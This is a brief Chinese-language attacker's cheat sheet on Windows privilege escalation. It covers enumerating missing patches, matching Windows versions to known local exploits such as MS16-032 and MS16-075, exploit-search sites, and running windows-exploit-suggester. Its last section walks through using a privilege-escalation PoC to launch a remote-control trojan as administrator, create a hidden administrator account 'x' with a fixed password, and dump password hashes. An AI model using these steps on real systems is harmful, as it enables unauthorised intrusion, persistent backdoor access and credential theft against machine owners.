# 漏洞利用与提权
## Windows漏洞搜寻
**补丁提取**
`wmic qfe get Caption,description,hotfixid,installedon`
利用补丁提取脚本
systeminfo 查看补丁(需要cmd权限)
`03：pr，巴西烤肉，ms 16-032，8120`
`08：ms 16-075（烂土豆），8120，ms 15-015`
`2012：同 08`
**搜索漏洞常用网站**
`https://exploit-db.com`
`https://packetstormsecurity.com`
`https://packetstormsecurity.com/search/?q=ms15-057`
`https://www.securityfocus.com/`
`https://www.securityfocus.com/bid`
`http://1337day.com`
`http://0day.today`
`http://seclists.org/fulldisclosure`
`http://exploitsearch.net`
`http://www.securiteam.com`
`http://metasploit.com/modules`
`http://securityreason.com`
`https://cxsecurity.com/exploit`
`http://securitytracker.com`


  
## Windows提权辅助工具 windows-exploit-suggester
使用方法：
`将服务器执行systeminfo > a.txt`
`windows-exploit-suggester.py --database 2019-01-01-mssb.xls --systeminfo a.txt`
`windows-exploit-suggester.py --audit --database 2019-01-01-mssb.xls --systeminfo a.txt`
`windows-exploit-suggester.py --audit  -l --database 2019-01-01-mssb.xls --systeminfo a.txt`


  
## Windows溢出提权
方法：
找到未打补丁的漏洞编号
`poc.exe muma.exe`   以管理员身份运行远控木马
`poc.exe “whoami”`查看执行身份权限
`poc.exe “net user x 123.com /add”`
`poc.exe “net localgroup administrators x /add”`
`poc.exe “getpass.exe”` 获取hash



